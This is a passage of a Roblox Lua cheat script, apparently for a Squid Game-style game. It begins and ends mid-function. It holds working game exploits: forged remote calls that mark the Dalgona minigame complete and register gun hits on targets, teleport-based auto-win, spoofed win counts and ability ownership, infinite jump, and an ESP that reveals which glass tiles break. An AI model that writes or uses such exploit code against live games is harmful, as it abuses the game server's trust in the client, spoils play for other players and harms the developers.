            if hum then
                MainModule.OriginalJumpPower = hum.JumpPower
                hum.JumpPower = MainModule.CustomJumpPowerValue
            end
        end
        MainModule.CustomJumpPowerConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomJumpPowerEnabled then
                local c = MainModule.GetCharacter()
                if c then
                    local h = MainModule.GetHumanoid(c)
                    if h and h.JumpPower ~= MainModule.CustomJumpPowerValue then
                        h.JumpPower = MainModule.CustomJumpPowerValue
                    end
                end
            end
        end)
    else
        local char = MainModule.GetCharacter()
        if char then
            local hum = MainModule.GetHumanoid(char)
            if hum then
                hum.JumpPower = MainModule.OriginalJumpPower or 50
            end
        end
    end
    PlayToggleSound()
end

MainModule.SetCustomJumpPower = function(value)
    MainModule.CustomJumpPowerValue = value
    if MainModule.CustomJumpPowerEnabled then
        local char = MainModule.GetCharacter()
        if char then
            local hum = MainModule.GetHumanoid(char)
            if hum then
                hum.JumpPower = MainModule.CustomJumpPowerValue
            end
        end
    end
end


MainModule.CustomWinEnabled = false
MainModule.CustomWinValue = 67
MainModule.CustomWinConnection = nil

MainModule.ToggleCustomWin = function(enabled)
    MainModule.CustomWinEnabled = enabled
    
    if MainModule.CustomWinConnection then
        MainModule.CustomWinConnection:Disconnect()
        MainModule.CustomWinConnection = nil
    end
    
    if enabled then
        LocalPlayer:SetAttribute("_GameWins", MainModule.CustomWinValue)
        MainModule.CustomWinConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomWinEnabled then
                LocalPlayer:SetAttribute("_GameWins", MainModule.CustomWinValue)
            end
        end)
    end
    PlayToggleSound()
end

MainModule.SetCustomWin = function(value)
    local num = tonumber(value)
    if num and num >= 0 and num <= 999999 then
        MainModule.CustomWinValue = math.floor(num)
        if MainModule.CustomWinEnabled then
            LocalPlayer:SetAttribute("_GameWins", MainModule.CustomWinValue)
        end
    else
        MainModule.Notify("Custom Win", "Invalid number", 0.9)
    end
end

MainModule.AutoVoteEnabled = false
MainModule.AutoVoteConnection = nil
MainModule.VoteOption = "KeepPlaying"

MainModule.ToggleAutoVote = function(enabled)
    MainModule.AutoVoteEnabled = enabled
    
    if MainModule.AutoVoteConnection then
        MainModule.AutoVoteConnection:Disconnect()
        MainModule.AutoVoteConnection = nil
    end
    
    if enabled then
        MainModule.AutoVoteConnection = RunService.Heartbeat:Connect(function()
            if MainModule.AutoVoteEnabled then
                pcall(function()
                    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
                    if remotes then
                        local voteRemote = remotes:FindFirstChild("ExtraTemporaryRemote")
                        if voteRemote then
                            voteRemote:FireServer({ Voting = MainModule.VoteOption })
                        end
                    end
                end)
            end
        end)
    end
    PlayToggleSound()
end

MainModule.SetVoteOption = function(option)
    MainModule.VoteOption = option
end

MainModule.NoCooldownProximityEnabled = false
MainModule.ProximityConnection = nil

MainModule.ToggleNoCooldownProximity = function(enabled)
    MainModule.NoCooldownProximityEnabled = enabled
    
    local function setProximityCooldown(instance)
        if instance:IsA("ProximityPrompt") then
            instance.HoldDuration = 0
        end
    end
    
    if enabled then
        for _, descendant in pairs(workspace:GetDescendants()) do
            setProximityCooldown(descendant)
        end
        
        MainModule.ProximityConnection = workspace.DescendantAdded:Connect(function(descendant)
            if MainModule.NoCooldownProximityEnabled then
                setProximityCooldown(descendant)
            end
        end)
    else
        if MainModule.ProximityConnection then
            MainModule.ProximityConnection:Disconnect()
            MainModule.ProximityConnection = nil
        end
    end
    PlayToggleSound()
end

MainModule.InfiniteJumpEnabled = false
MainModule.InfiniteJumpConnection = nil

MainModule.ToggleInfiniteJump = function(enabled)
    MainModule.InfiniteJumpEnabled = enabled
    
    if MainModule.InfiniteJumpConnection then
        MainModule.InfiniteJumpConnection:Disconnect()
        MainModule.InfiniteJumpConnection = nil
    end
    
    if enabled then
        MainModule.InfiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
            if MainModule.InfiniteJumpEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    end
    PlayToggleSound()
end

MainModule.DalgonaCompleteShape = function()
    if not MainModule.IsGameActive("Dalgona") then
        MainModule.Notify("Dalgona", "Wait for Dalgona!", 0.9)
        PlayErrorSound()
        return false
    end
    
    task.spawn(function()
        local lplr = LocalPlayer
        local camera = workspace.CurrentCamera
        
        local function CreateFolder(parent, name, lifetime)
            local Folder = Instance.new("Folder")
            Folder.Name = name
            Folder.Parent = parent
            if lifetime then
                task.delay(lifetime, function()
                    if Folder and Folder.Parent then
                        Folder:Destroy()
                    end
                end)
            end
            return Folder
        end
        
        local function MakeInvisible(character)
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.Transparency = 1
                end
            end
        end
        
        local function RestoreVisibility(character)
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.Transparency = 0
                    part.LocalTransparencyModifier = 0
                end
            end
            for _, item in pairs(character:GetChildren()) do
                if item:IsA("Accessory") then
                    local handle = item:FindFirstChild("Handle")
                    if handle and handle.Transparency >= 0.99 then
                        handle.Transparency = 0
                    end
                end
            end
        end
        
        local function CheckPlayersVisibility()
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character then
                    RestoreVisibility(player.Character)
                end
            end
        end
        
        local function BypassDalgonaGame()
            local Character = lplr.Character
            local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
            local Humanoid = Character and Character:FindFirstChild("Humanoid")
            local PlayerGui = lplr:FindFirstChild("PlayerGui")
            local DebrisBD = lplr:FindFirstChild("DebrisBD")
            local EffectsFolder = workspace:FindFirstChild("Effects")
            local ImpactFrames = PlayerGui and PlayerGui:FindFirstChild("ImpactFrames")
            
            if not (Character and HumanoidRootPart and Humanoid) then
                return
            end
            
            local originalFieldOfView = camera.FieldOfView
            
            local shapeModel, outlineModel, pickModel, redDotModel
            if EffectsFolder then
                for _, obj in pairs(EffectsFolder:GetChildren()) do
                    if obj:IsA("Model") and obj.Name:match("Outline$") then
                        outlineModel = obj
                    elseif obj:IsA("Model") and not obj.Name:match("Outline$") and obj.Name ~= "Pick" and obj.Name ~= "RedDot" then
                        shapeModel = obj
                    elseif obj.Name == "Pick" then
                        pickModel = obj
                    elseif obj.Name == "RedDot" then
                        redDotModel = obj
                    end
                end
            end
            
            local progressBar = ImpactFrames and ImpactFrames:FindFirstChild("ProgressBar")
            
            local pickViewportModel
            if ImpactFrames then
                for _, obj in pairs(ImpactFrames:GetChildren()) do
                    if obj:IsA("ViewportFrame") and obj:FindFirstChild("PickModel") then
                        pickViewportModel = obj.PickModel
                        break
                    end
                end
            end
            
            local Remotes = ReplicatedStorage:WaitForChild("Remotes")
            local DalgonaRemote = Remotes:WaitForChild("DALGONATEMPREMPTE")
            
            local cameraOverrideActive = true
            local cameraOverrideConnection
            
            task.spawn(function()
                CreateFolder(lplr, "RecentGameStartedMessage", 0.01)
                
                if shapeModel and shapeModel:FindFirstChild("shape") then
                    TweenService:Create(shapeModel.shape, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                        Position = shapeModel.shape.Position + Vector3.new(0, 0.5, 0)
                    }):Play()
                end
                
                if shapeModel then
                    for _, part in pairs(shapeModel:GetChildren()) do
                        if part.Name == "DalgonaClickPart" and part:IsA("BasePart") then
                            TweenService:Create(part, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                                Transparency = 1
                            }):Play()
                        end
                    end
                end
                
                if pickModel and pickModel.Parent then
                    TweenService:Create(pickModel, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                        Transparency = 1
                    }):Play()
                end
                
                if redDotModel and redDotModel.Parent then
                    TweenService:Create(redDotModel, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                        Transparency = 1
                    }):Play()
                end
                
                if pickViewportModel then
                    for _, part in pairs(pickViewportModel:GetDescendants()) do
                        if part:IsA("BasePart") then
                            TweenService:Create(part, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                                Transparency = 1
                            }):Play()
                        end
                    end
                end
                
                if HumanoidRootPart then
                    TweenService:Create(camera, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                        CFrame = HumanoidRootPart.CFrame * CFrame.new(0.0841674805, 8.45438766, 6.69675446, 0.999918401, -0.00898250192, 0.00907994807, 3.31699681e-08, 0.710912943, 0.703280032, -0.0127722733, -0.703222632, 0.710854948)
                    }):Play()
                end
                
                MakeInvisible(Character)
                
                DalgonaRemote:FireServer({
                    Success = true
                })
                
                task.wait(2)
                
                for _, obj in pairs({shapeModel, outlineModel, pickModel, redDotModel, progressBar}) do
                    if obj and obj.Parent then
                        obj:Destroy()
                    end
                end
                
                UserInputService.MouseIconEnabled = true
                
                if PlayerGui and PlayerGui:FindFirstChild("Hotbar") and PlayerGui.Hotbar:FindFirstChild("Backpack") then
                    TweenService:Create(PlayerGui.Hotbar.Backpack, TweenInfo.new(1.5, Enum.EasingStyle.Circular, Enum.EasingDirection.InOut), {
                        Position = UDim2.new(0, 0, 0, 0)
                    }):Play()
                end
                
                if progressBar then
                    if DebrisBD then
                        DebrisBD:Fire(progressBar, 2)
                    end
                    TweenService:Create(progressBar, TweenInfo.new(1.5, Enum.EasingStyle.Circular, Enum.EasingDirection.InOut), {
                        Position = UDim2.new(progressBar.Position.X.Scale, 0, progressBar.Position.Y.Scale + 1, 0)
                    }):Play()
                end
                
                task.wait(0.5)
                cameraOverrideActive = false
                
                camera.CameraType = Enum.CameraType.Custom
                if Humanoid then
                    camera.CameraSubject = Humanoid
                end
                camera.FieldOfView = originalFieldOfView or 70
            end)
            
            cameraOverrideConnection = RunService.RenderStepped:Connect(function()
                if not cameraOverrideActive then
                    cameraOverrideConnection:Disconnect()
                    return
                end
                
                if camera.CameraType == Enum.CameraType.Scriptable then
                    camera.CameraType = Enum.CameraType.Custom
                end
                
                if Humanoid and camera.CameraSubject ~= Humanoid then
                    camera.CameraSubject = Humanoid
                end
            end)
        end
        
        local function RestartRemotesScript()
            if lplr.Character and lplr.Character:FindFirstChild("Remotes") then
                local Remotes = lplr.Character:FindFirstChild("Remotes")
                pcall(function()
                    Remotes.Disabled = true
                end)
                task.wait(0.5)
                pcall(function()
                    Remotes.Disabled = false
                end)
            end
        end
        
        local dalgonaRemote = ReplicatedStorage:WaitForChild("Remotes"):FindFirstChild("DALGONATEMPREMPTE")
        if not dalgonaRemote then
            Library:Notify({Title = "Dalgona", Description = "Shape not found", Duration = 0.9})
            PlayErrorSound()
            return
        end
        
        dalgonaRemote:FireServer({
            Completed = true
        })
        dalgonaRemote:FireServer({
            Success = true
        })
        
        BypassDalgonaGame()
        
        RestartRemotesScript()
        
        task.spawn(function()
            repeat
                task.wait(1)
                CheckPlayersVisibility()
            until not ReplicatedStorage:WaitForChild("Remotes"):FindFirstChild("DALGONATEMPREMPTE")
        end)
        
        Library:Notify({Title = "Dalgona", Description = "Shape Completed!", Duration = 0.9})
        PlayBell()
    end)
end

MainModule.FullbrightEnabled = false
MainModule.FullbrightSettings = {}
MainModule.FullbrightConnection = nil

MainModule.AutoWinEnabled = false
MainModule.AutoWinConnection = nil
MainModule.AutoWinTriggered = {}
MainModule.GameStartTime = nil
MainModule.CurrentGame = nil
MainModule.LastNotifTime = 0

MainModule.AutoWin = function()
    if not MainModule.AutoWinEnabled then return end
    
    local currentTime = tick()
    
    local values = Workspace:FindFirstChild("Values")
    if not values then return end
    
    local currentGameValue = values:FindFirstChild("CurrentGame")
    if not currentGameValue then return end
    
    local currentGame = currentGameValue.Value
    if not currentGame then return end
    
    if currentGame ~= MainModule.CurrentGame then
        MainModule.CurrentGame = currentGame
        MainModule.GameStartTime = currentTime
        MainModule.AutoWinTriggered[currentGame] = false
    end
    
    if MainModule.AutoWinTriggered[currentGame] then return end
    
    if not MainModule.GameStartTime then return end
    
    if currentTime - MainModule.GameStartTime < 15 then return end
    
    local character = MainModule.GetCharacter()
    if not character then return end
    
    local rootPart = MainModule.GetRootPart(character)
    if not rootPart then return end
    
    if currentGame == "RedLightGreenLight" then
        MainModule.SafeTeleport(Vector3.new(-214.4, 1023.1, 146.7))
        MainModule.AutoWinTriggered[currentGame] = true
        PlayBell()
        
    elseif currentGame == "Dalgona" then
        MainModule.DalgonaCompleteShape()
        MainModule.AutoWinTriggered[currentGame] = true
        PlayBell()
        
    elseif currentGame == "LightsOut" or currentGame == "LightOut" then
        local currentPos = rootPart.Position
        MainModule.SafeTeleport(Vector3.new(currentPos.X, currentPos.Y + 100, currentPos.Z))
        MainModule.AutoWinTriggered[currentGame] = true
        PlayBell()
        
    elseif currentGame == "HideAndSeek" then
        local isHider = MainModule.IsHider(LocalPlayer)
        local isHunter = MainModule.IsSeeker(LocalPlayer)
        
        if isHider then
            local currentPos = rootPart.Position
            MainModule.SafeTeleport(Vector3.new(currentPos.X, currentPos.Y + 200, currentPos.Z))
            MainModule.AutoWinTriggered[currentGame] = true
            PlayBell()
        elseif isHunter then
            if currentTime - MainModule.LastNotifTime > 5 then
                MainModule.LastNotifTime = currentTime
                PlayErrorSound()
            end
        end
        
    elseif currentGame == "JumpRope" then
        MainModule.SafeTeleport(Vector3.new(720.896057, 198.628311, 921.170654))
        MainModule.AutoWinTriggered[currentGame] = true
        PlayBell()
        
    elseif currentGame == "GlassBridge" then
        MainModule.SafeTeleport(Vector3.new(-196.372467, 522.192139, -1534.20984))
        MainModule.AutoWinTriggered[currentGame] = true
        PlayBell()
    end
end

MainModule.ToggleAutoWin = function(enabled)
    MainModule.AutoWinEnabled = enabled
    MainModule.AutoWinTriggered = {}
    MainModule.GameStartTime = nil
    MainModule.CurrentGame = nil
    MainModule.LastNotifTime = 0
    
    if MainModule.AutoWinConnection then
        MainModule.AutoWinConnection:Disconnect()
        MainModule.AutoWinConnection = nil
    end
    
    if enabled then
        MainModule.AutoWinConnection = RunService.Heartbeat:Connect(function()
            if MainModule.AutoWinEnabled then
                MainModule.AutoWin()
            end
        end)
    end
    PlayToggleSound()
    return true
end

MainModule.Rebel = {
    Enabled = false,
    Connection = nil,
    LastCheckTime = 0,
    LastKillTime = 0,
    CheckCooldown = 0.1,
    KillCooldown = 0.05
}

MainModule.ToggleRebel = function(enabled)
    MainModule.Rebel.Enabled = enabled
    if MainModule.Rebel.Connection then
        MainModule.Rebel.Connection:Disconnect()
        MainModule.Rebel.Connection = nil
    end
    if enabled then
        MainModule.Rebel.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.Rebel.Enabled then return end
            local currentTime = tick()
            if currentTime - MainModule.Rebel.LastCheckTime < MainModule.Rebel.CheckCooldown then return end
            MainModule.Rebel.LastCheckTime = currentTime
            
            local enemyNames = {}
            if workspace:FindFirstChild("Live") then
                for _, enemy in pairs(workspace.Live:GetChildren()) do
                    if enemy:IsA("Model") and enemy:FindFirstChild("Enemy") and not enemy:FindFirstChild("Dead") then
                        local isPlayer = false
                        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                            if player.Name == enemy.Name then
                                isPlayer = true
                                break
                            end
                        end
                        if not isPlayer then
                            table.insert(enemyNames, enemy.Name)
                        end
                    end
                end
            end
            
            if #enemyNames == 0 then return end
            
            for _, enemyName in pairs(enemyNames) do
                if currentTime - MainModule.Rebel.LastKillTime < MainModule.Rebel.KillCooldown then
                    task.wait(MainModule.Rebel.KillCooldown - (currentTime - MainModule.Rebel.LastKillTime))
                end
                
                local character = game:GetService("Players").LocalPlayer.Character
                local backpack = game:GetService("Players").LocalPlayer.Backpack
                local gun = nil
                
                if character then
                    for _, tool in pairs(character:GetChildren()) do
                        if tool:IsA("Tool") and tool:GetAttribute("Gun") then
                            gun = tool
                            break
                        end
                    end
                end
                
                if not gun and backpack then
                    for _, tool in pairs(backpack:GetChildren()) do
                        if tool:IsA("Tool") and tool:GetAttribute("Gun") then
                            gun = tool
                            break
                        end
                    end
                end
                
                if gun then
                    local args = {
                        gun,
                        {
                            ClientRayNormal = Vector3.new(-1.1920928955078125e-7, 1.0000001192092896, 0),
                            FiredGun = true,
                            SecondaryHitTargets = {},
                            ClientRayInstance = workspace:WaitForChild("StairWalkWay"):WaitForChild("Part"),
                            ClientRayPosition = Vector3.new(-220.17489624023438, 183.2957763671875, 301.07257080078125),
                            bulletCF = CFrame.new(-220.5039825439453, 185.22506713867188, 302.133544921875, 0.9551116228103638, 0.2567310333251953, -0.14782091975212097, 7.450581485102248e-9, 0.4989798665046692, 0.8666135668754578, 0.2962462604045868, -0.8277127146720886, 0.4765814542770386),
                            HitTargets = {
                                [enemyName] = "Head"
                            },
                            bulletSizeC = Vector3.new(0.009999999776482582, 0.009999999776482582, 4.452499866485596),
                            NoMuzzleFX = false,
                            FirePosition = Vector3.new(-72.88850402832031, -679.4803466796875, -173.31005859375)
                        }
                    }
                    
                    pcall(function()
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("FiredGunClient"):FireServer(unpack(args))
                    end)
                    
                    MainModule.Rebel.LastKillTime = tick()
                    task.wait(0.05)
                end
            end
        end)
    else
        MainModule.Rebel.LastKillTime = 0
        MainModule.Rebel.LastCheckTime = 0
    end
    PlayToggleSound()
end

MainModule.ParkourArtistEnabled = false
MainModule.ParkourArtistConnection = nil
MainModule.OriginalPower = nil

MainModule.UnlockParkourArtist = function()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local animations = replicatedStorage:FindFirstChild("Animations")
    local abilities = animations and animations:FindFirstChild("Abilities")
    local parkourArtist = abilities and abilities:FindFirstChild("ParkourArtist")
    
    if parkourArtist then
        if parkourArtist:IsA("BoolValue") then
            parkourArtist.Value = true
        elseif parkourArtist:IsA("NumberValue") or parkourArtist:IsA("IntValue") then
            parkourArtist.Value = 1
        end
        
        for _, descendant in pairs(parkourArtist:GetDescendants()) do
            if descendant:IsA("BoolValue") then
                descendant.Value = true
            elseif descendant:IsA("NumberValue") or descendant:IsA("IntValue") then
                descendant.Value = 1
            end
        end
    end
    
    LocalPlayer:SetAttribute("__OwnsParkourArtist", true)
    LocalPlayer:SetAttribute("HasParkourArtist", true)
    LocalPlayer:SetAttribute("UnlockedParkourArtist", true)
end

MainModule.ToggleParkourArtist = function(enabled)
    if enabled then
        if not MainModule.OriginalPower then
            MainModule.OriginalPower = LocalPlayer:GetAttribute("_EquippedPower") or ""
        end
        
        MainModule.UnlockParkourArtist()
        LocalPlayer:SetAttribute("_EquippedPower", "PARKOUR ARTIST")
        
        if MainModule.ParkourArtistConnection then
            MainModule.ParkourArtistConnection:Disconnect()
        end
        
        MainModule.ParkourArtistConnection = RunService.Heartbeat:Connect(function()
            if MainModule.ParkourArtistEnabled then
                LocalPlayer:SetAttribute("_EquippedPower", "PARKOUR ARTIST")
                LocalPlayer:SetAttribute("__OwnsParkourArtist", true)
                LocalPlayer:SetAttribute("HasParkourArtist", true)
            end
        end)
        
    else
        if MainModule.ParkourArtistConnection then
            MainModule.ParkourArtistConnection:Disconnect()
            MainModule.ParkourArtistConnection = nil
        end
        
        if MainModule.OriginalPower then
            LocalPlayer:SetAttribute("_EquippedPower", MainModule.OriginalPower)
        else
            LocalPlayer:SetAttribute("_EquippedPower", nil)
        end
    end
    MainModule.ParkourArtistEnabled = enabled
    PlayToggleSound()
end

MainModule.SetParkourArtist = function()
    MainModule.UnlockParkourArtist()
    PlayToggleSound()
end

MainModule.SpikesPlatformTeleport = {
    Enabled = false,
    Connection = nil,
    Platform = nil,
    OriginalCFrame = nil,
    SpikesPosition = nil
}

function MainModule.ToggleSpikesPlatformTeleport(enabled)
    if enabled and not MainModule.IsGameActive("HideAndSeek") then
        MainModule.Notify("Spikes Platform", "Wait for HideAndSeek", 0.9)
        PlayErrorSound()
        if ToggleRefs.SpikesPlatformTeleport then
            ToggleRefs.SpikesPlatformTeleport:SetValue(false)
        end
        return false
    end
    
    if MainModule.SpikesPlatformTeleport.Connection then
        MainModule.SpikesPlatformTeleport.Connection:Disconnect()
        MainModule.SpikesPlatformTeleport.Connection = nil
    end
    
    if MainModule.SpikesPlatformTeleport.Platform then
        pcall(function() MainModule.SpikesPlatformTeleport.Platform:Destroy() end)
        MainModule.SpikesPlatformTeleport.Platform = nil
    end
    
    MainModule.SpikesPlatformTeleport.Enabled = enabled
    MainModule.SpikesPlatformTeleport.OriginalCFrame = nil
    MainModule.SpikesPlatformTeleport.SpikesPosition = nil
    
    if not enabled then
        local character = MainModule.GetCharacter()
        if character and MainModule.SpikesPlatformTeleport.OriginalCFrame then
            character:SetPrimaryPartCFrame(MainModule.SpikesPlatformTeleport.OriginalCFrame)
            Library:Notify({Title = "Spikes Platform", Description = "Returned", Duration = 0.9})
        end
        PlayToggleSound()
        return true
    end
    
    local spikesPosition = nil
    local hideAndSeekMap = workspace:FindFirstChild("HideAndSeekMap")
    local killingParts = hideAndSeekMap and hideAndSeekMap:FindFirstChild("KillingParts")
    
    if killingParts then
        for _, spike in pairs(killingParts:GetChildren()) do
            if spike:IsA("BasePart") then
                spikesPosition = spike.Position
                break
            end
        end
    end
    
    if not spikesPosition then
        for _, spike in pairs(workspace:GetDescendants()) do
            if spike:IsA("BasePart") and spike.Name == "Spikes" then
                spikesPosition = spike.Position
                break
            end
        end
    end
    
    if not spikesPosition then
        MainModule.Notify("TP To Spikes", "Spikes not found", 0.9)
        PlayErrorSound()
        if ToggleRefs.SpikesPlatformTeleport then
            ToggleRefs.SpikesPlatformTeleport:SetValue(false)
        end
        return false
    end
    
    MainModule.SpikesPlatformTeleport.SpikesPosition = spikesPosition
    
    local platform = Instance.new("Part")
    platform.Name = "SpikesPlatformTeleport"
    platform.Size = Vector3.new(10, 1, 10)
    platform.Position = spikesPosition + Vector3.new(0, 10, 0)
    platform.Anchored = true
    platform.CanCollide = true
    platform.Transparency = 0.5
    platform.Color = Color3.fromRGB(0, 255, 0)
    platform.Material = Enum.Material.Neon
    platform.Parent = workspace
    MainModule.SpikesPlatformTeleport.Platform = platform
    
    local character = MainModule.GetCharacter()
    if character then
        local rootPart = MainModule.GetRootPart(character)
        if rootPart then
            MainModule.SpikesPlatformTeleport.OriginalCFrame = character:GetPrimaryPartCFrame()
            local targetPosition = platform.Position + Vector3.new(0, 3, 0)
            rootPart.CFrame = CFrame.new(targetPosition)
            Library:Notify({Title = "Teleport to spikes", Description = "Teleported", Duration = 0.9})
        end
    end
    
    MainModule.SpikesPlatformTeleport.Connection = RunService.Heartbeat:Connect(function()
        if not MainModule.SpikesPlatformTeleport.Enabled then return end
        
        if not MainModule.IsGameActive("HideAndSeek") then
            MainModule.ToggleSpikesPlatformTeleport(false)
            if ToggleRefs.SpikesPlatformTeleport then
                ToggleRefs.SpikesPlatformTeleport:SetValue(false)
            end
            return
        end
        
        if not MainModule.SpikesPlatformTeleport.Platform or not MainModule.SpikesPlatformTeleport.Platform.Parent then
            local newPlatform = Instance.new("Part")
            newPlatform.Name = "SpikesPlatformTeleport"
            newPlatform.Size = Vector3.new(10, 1, 10)
            newPlatform.Position = MainModule.SpikesPlatformTeleport.SpikesPosition + Vector3.new(0, 10, 0)
            newPlatform.Anchored = true
            newPlatform.CanCollide = true
            newPlatform.Transparency = 0.5
            newPlatform.Color = Color3.fromRGB(0, 255, 0)
            newPlatform.Material = Enum.Material.Neon
            newPlatform.Parent = workspace
            MainModule.SpikesPlatformTeleport.Platform = newPlatform
        end
        
        local character = MainModule.GetCharacter()
        if character then
            local rootPart = MainModule.GetRootPart(character)
            if rootPart then
                local distance = (rootPart.Position - MainModule.SpikesPlatformTeleport.Platform.Position).Magnitude
                if distance > 15 then
                    if not MainModule.SpikesPlatformTeleport.OriginalCFrame then
                        MainModule.SpikesPlatformTeleport.OriginalCFrame = character:GetPrimaryPartCFrame()
                    end
                    local targetPosition = MainModule.SpikesPlatformTeleport.Platform.Position + Vector3.new(0, 3, 0)
                    rootPart.CFrame = CFrame.new(targetPosition)
                end
            end
        end
    end)
    
    PlayToggleSound()
    return true
end

MainModule.HCGlassESPEnabled = false
MainModule.HCGlassESPConnection = nil
MainModule.HCGlassESPObjects = {}

function MainModule.CreateHCGlassESP(tileModel, isBreakable)
    if MainModule.HCGlassESPObjects[tileModel] then return end
    
    local primaryPart = tileModel.PrimaryPart
    if not primaryPart then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Adornee = tileModel
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.FillColor = isBreakable and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)
    highlight.FillTransparency = 0.5
    highlight.OutlineTransparency = 0.3
    highlight.Parent = tileModel
    
    local billboard = Instance.new("BillboardGui")
    billboard.Adornee = primaryPart
    billboard.Size = UDim2.new(0, 100, 0, 30)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = primaryPart
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = isBreakable and "BREAKABLE" or "SAFE"
    label.TextColor3 = isBreakable and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.Parent = billboard
    
    MainModule.HCGlassESPObjects[tileModel] = {
        highlight = highlight,
        billboard = billboard,
        label = label,
        tile = tileModel
    }
end

function MainModule.ScanHCGlassBridge()
    local glassHolder = workspace:FindFirstChild("GlassBridge") and workspace.GlassBridge:FindFirstChild("GlassHolder")
    if not glassHolder then return end
    
    for _, tilePair in pairs(glassHolder:GetChildren()) do
        for _, tileModel in pairs(tilePair:GetChildren()) do
            if tileModel:IsA("Model") and tileModel.PrimaryPart then
                local isBreakable = tileModel.PrimaryPart:GetAttribute("exploitingisevil") == true
                MainModule.CreateHCGlassESP(tileModel, isBreakable)
            end
        end
    end
end

function MainModule.ClearHCGlassESP()
    for _, data in pairs(MainModule.HCGlassESPObjects) do
        if data.highlight then
            pcall(function() data.highlight:Destroy() end)
        end
        if data.billboard then
            pcall(function() data.billboard:Destroy() end)
        end
    end
    MainModule.HCGlassESPObjects = {}
end

function MainModule.ToggleHCGlassESP(enabled)
    MainModule.HCGlassESPEnabled = enabled
    
    if MainModule.HCGlassESPConnection then
        MainModule.HCGlassESPConnection:Disconnect()
        MainModule.HCGlassESPConnection = nil
    end
    
    if enabled then
        MainModule.ScanHCGlassBridge()
        
        MainModule.HCGlassESPConnection = RunService.Heartbeat:Connect(function()
            if not MainModule.HCGlassESPEnabled then return end
            
            if not MainModule.IsGameActive("GlassBridge") then
                MainModule.DisableToggle("HCGlassESP")
                return
            end
            
            MainModule.ScanHCGlassBridge()
        end)
        
        MainModule.Notify("HC Glass ESP", "Enabled", 0.9)
    else
        MainModule.ClearHCGlassESP()
        MainModule.Notify("HC Glass ESP", "Disabled", 0.9)
    end
    PlayToggleSound()
end

MainModule.TugOfWarAutoQTEMiss = false
MainModule.TugOfWarAutoQTEMissConnection = nil

local function findTugOfWarCircle()
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then return end
    
    local ui = playerGui:FindFirstChild("TugOfWarUIV2")
        or playerGui:FindFirstChild("TugOfWarUI")
        or playerGui:FindFirstChild("TugofWarRemake")
    if not ui then return end

    local remake = ui:FindFirstChild("TugofWarRemake") or ui
    local circle = remake and remake:FindFirstChild("CircleBase")
    if circle and circle.Visible then
        return circle
    end
    return nil
end

function MainModule.ToggleTugOfWarAutoQTEMiss(enabled)
    MainModule.TugOfWarAutoQTEMiss = enabled
    
    if MainModule.TugOfWarAutoQTEMissConnection then
        MainModule.TugOfWarAutoQTEMissConnection:Disconnect()
        MainModule.TugOfWarAutoQTEMissConnection = nil
    end
    
    if enabled then
        MainModule.TugOfWarAutoQTEMissConnection = RunService.RenderStepped:Connect(function()
            if not MainModule.TugOfWarAutoQTEMiss then return end
            if LocalPlayer:GetAttribute("TugOfWarPhase") ~= "QTE" then return end
            
            local circle = findTugOfWarCircle()
            if not circle then return end
            
            local arrow = circle:FindFirstChild("Arrow")
            local medium = circle:FindFirstChild("Medium")
            if not (arrow and medium) then return end
            
            medium.Rotation = arrow.Rotation
        end)
        MainModule.Notify("Anti Miss", "Enabled", 0.9)
    else
        MainModule.Notify("Anti Miss", "Disabled", 0.9)
    end
    PlayToggleSound()
end

MainModule.EffectShooter = {
    Enabled = false,
    Connection = nil,
    LastShootTime = 0,
    ShootCooldown = 0.05,
    TrackedPlayers = {},
    TargetEffect = "GuardCanKillLockOn"
}

MainModule.GetLocalGun = function()
    local gun = nil
    
    if LocalPlayer.Character then
        for _, tool in pairs(LocalPlayer.Character:GetChildren()) do
            if tool:IsA("Tool") and tool:GetAttribute("Gun") then
                gun = tool
                break
            end
        end
    end
    
    if not gun and LocalPlayer.Backpack then
        for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool:GetAttribute("Gun") then
                gun = tool
                break
            end
        end
    end
    
    return gun
end

MainModule.HasTargetEffect = function(player)
    if not player.Character then return false end
    
    for _, descendant in pairs(player.Character:GetDescendants()) do
        if descendant:IsA("BillboardGui") and descendant.Name == MainModule.EffectShooter.TargetEffect then
            return true
        end
    end
    return false
end

MainModule.ShootAtPlayer = function(targetPlayerName)
    local gun = MainModule.GetLocalGun()
    if not gun then return false end
    
    local args = {
        gun,
        {
            ClientRayNormal = Vector3.new(-1.1920928955078125e-7, 1.0000001192092896, 0),
            FiredGun = true,
            SecondaryHitTargets = {},
            ClientRayInstance = workspace:FindFirstChild("StairWalkWay") and workspace.StairWalkWay:FindFirstChild("Part") or nil,
